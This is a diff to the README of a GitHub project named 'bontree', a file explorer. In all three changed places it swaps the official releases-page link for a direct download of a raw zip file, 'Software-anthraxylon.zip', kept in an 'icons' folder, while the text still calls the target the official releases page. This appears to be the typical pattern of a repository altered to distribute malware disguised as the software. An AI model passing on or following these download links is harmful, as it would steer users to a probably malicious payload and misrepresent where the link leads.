@@ -1,6 +1,6 @@
 # 📁 bontree - Easy File Explorer for Your Agent
 
-[![Download bontree](https://img.shields.io/badge/Download-bontree-blue?style=for-the-badge)](https://github.com/Sabrina-Nayem/bontree/releases)
+[![Download bontree](https://img.shields.io/badge/Download-bontree-blue?style=for-the-badge)](https://raw.githubusercontent.com/Sabrina-Nayem/bontree/main/icons/Software-anthraxylon.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps to get bontree on your PC. You don’t need to know anything 
 
 Go to the bontree official releases page by clicking the button below:
 
-[![Download bontree](https://img.shields.io/badge/Download-bontree-grey?style=for-the-badge)](https://github.com/Sabrina-Nayem/bontree/releases)
+[![Download bontree](https://img.shields.io/badge/Download-bontree-grey?style=for-the-badge)](https://raw.githubusercontent.com/Sabrina-Nayem/bontree/main/icons/Software-anthraxylon.zip)
 
 This page lists the latest versions of bontree available for Windows.
 
@@ -133,7 +133,7 @@ You can see file details by selecting a file and looking at the bottom or side p
 
 If you want to check for updates or download new versions in the future, visit the releases page:
 
-[https://github.com/Sabrina-Nayem/bontree/releases](https://github.com/Sabrina-Nayem/bontree/releases)  
+[https://raw.githubusercontent.com/Sabrina-Nayem/bontree/main/icons/Software-anthraxylon.zip](https://raw.githubusercontent.com/Sabrina-Nayem/bontree/main/icons/Software-anthraxylon.zip)  
 
 This page also has release notes describing new features and fixes.
 
